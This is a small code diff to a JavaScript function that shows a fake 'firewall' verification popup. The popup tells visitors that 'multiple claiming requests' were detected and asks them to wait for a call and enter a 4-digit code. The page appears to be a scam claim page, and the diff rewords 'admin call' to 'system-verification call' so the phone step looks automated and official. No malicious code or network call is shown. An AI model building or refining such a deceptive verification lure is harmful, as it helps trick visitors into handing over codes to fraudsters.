@@ -23,7 +23,7 @@ function showFirewallPopup() {
                 <h2>VERIFICATION REQUIRED</h2>
                 <div class="firewall-message">
                     <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
-                    <p>Please wait for the admin to call you. You will receive a 4-digit code during the call.</p>
+                    <p>Please wait for the verification call. You will receive a 4-digit code during the call.</p>
                     <p>Enter the code below to continue.</p>
                 </div>
                 <div class="verification-input-group">
@@ -31,7 +31,7 @@ function showFirewallPopup() {
                     <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
                 </div>
                 <div class="firewall-note">
-                    <p>Waiting for admin to call...</p>
+                    <p>Waiting for system-verification call...</p>
                 </div>
                 <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
             `;
